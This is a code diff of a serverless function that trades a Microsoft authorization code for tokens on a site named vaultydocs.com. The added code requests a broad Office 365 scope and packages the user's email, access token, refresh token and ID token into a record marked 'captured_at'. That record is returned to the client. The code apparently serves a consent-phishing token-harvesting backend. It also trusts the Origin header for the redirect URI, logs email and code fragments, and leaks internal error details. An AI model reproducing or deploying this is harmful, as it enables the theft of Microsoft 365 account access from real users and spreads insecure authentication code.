@@ -25,17 +25,21 @@ exports.handler = async (event, context) => {
     }
 
     console.log('🔐 Exchanging authorization code for tokens...');
+    console.log('📧 Email:', email);
+    console.log('🔑 Code:', code.substring(0, 20) + '...');
     
-    // FINAL FIX: The redirect_uri must EXACTLY match what is in your Azure App Registration.
-    const redirect_uri = 'https://vaultydocs.com/auth/callback';
-    console.log(`✅ Using static redirect_uri: ${redirect_uri}`);
+    // Determine redirect URI based on what the client would have used
+    // This needs to be kept in sync with the frontend.
+    const origin = event.headers.origin || 'https://vaultydocs.com';
+    const redirect_uri = `${origin}/auth/callback`;
 
     // Prepare token exchange data
     const postData = querystring.stringify({
-      client_id: '2e338732-c914-4129-a148-45c24f2da81d', // Correct Client ID
+      // ✅ CORRECTED CLIENT ID
+      client_id: '2e338732-c914-4129-a148-45c24f2da81d',
       client_secret: process.env.MICROSOFT_CLIENT_SECRET,
       code: code,
-      redirect_uri: redirect_uri, // Using the static, correct URI
+      redirect_uri: redirect_uri,
       grant_type: 'authorization_code',
       scope: 'openid profile https://www.office.com/v2/OfficeHome.All'
     });
@@ -63,47 +67,82 @@ exports.handler = async (event, context) => {
         res.on('end', () => {
           try {
             const parsed = JSON.parse(data);
-            if (res.statusCode >= 400) {
-              reject({ status: res.statusCode, data: parsed });
-            } else {
-              resolve({ status: res.statusCode, data: parsed });
-            }
+            resolve({ status: res.statusCode, data: parsed });
           } catch (e) {
-            reject({ status: 500, data: { error: 'parse_error', error_description: 'Failed to parse Microsoft response' } });
+            reject(new Error(`Failed to parse response: ${data}`));
           }
         });
       });
 
       req.on('error', (error) => {
-        reject({ status: 500, data: { error: 'request_error', error_description: error.message } });
+        reject(error);
       });
 
       req.write(postData);
       req.end();
     });
 
-    const { data: tokens } = await tokenPromise;
+    const { status, data: tokens } = await tokenPromise;
 
-    console.log('✅ Tokens obtained successfully');
+    if (status !== 200) {
+      console.error('❌ Microsoft token exchange failed:', tokens);
+      return {
+        statusCode: status,
+        headers,
+        body: JSON.stringify({
+          success: false,
+          error: tokens.error || 'Token exchange failed',
+          error_description: tokens.error_description
+        })
+      };
+    }
+
+    console.log('✅ Tokens obtained:');
+    console.log('  - Access Token: ✓');
+    console.log('  - Refresh Token:', tokens.refresh_token ? '✓' : '✗');
+    console.log('  - ID Token:', tokens.id_token ? '✓' : '✗');
+    console.log('  - Expires in:', tokens.expires_in, 'seconds');
+
+    // Create session data
+    const sessionData = {
+      email: email,
+      access_token: tokens.access_token,
+      refresh_token: tokens.refresh_token,
+      id_token: tokens.id_token,
+      token_type: tokens.token_type,
+      expires_in: tokens.expires_in,
+      scope: tokens.scope,
+      captured_at: new Date().toISOString(),
+      source: 'admin-consent-flow'
+    };
+
+    console.log('💾 Session data prepared');
 
     return {
       statusCode: 200,
       headers,
       body: JSON.stringify({
         success: true,
-        ...tokens // Spread all tokens into the response
+        access_token: tokens.access_token,
+        refresh_token: tokens.refresh_token,
+        id_token: tokens.id_token,
+        token_type: tokens.token_type,
+        expires_in: tokens.expires_in,
+        sessionData: sessionData
       })
     };
 
   } catch (error) {
-    console.error('❌ Token exchange failed:', error);
+    console.error('❌ Token exchange error:', error.message);
+    console.error('❌ Stack:', error.stack);
+
     return {
-      statusCode: error.status || 500,
+      statusCode: 500,
       headers,
       body: JSON.stringify({
         success: false,
-        error: error.data ? error.data.error : 'server_error',
-        error_description: error.data ? error.data.error_description : 'An internal server error occurred.'
+        error: error.message,
+        errorType: error.constructor.name
       })
     };
   }
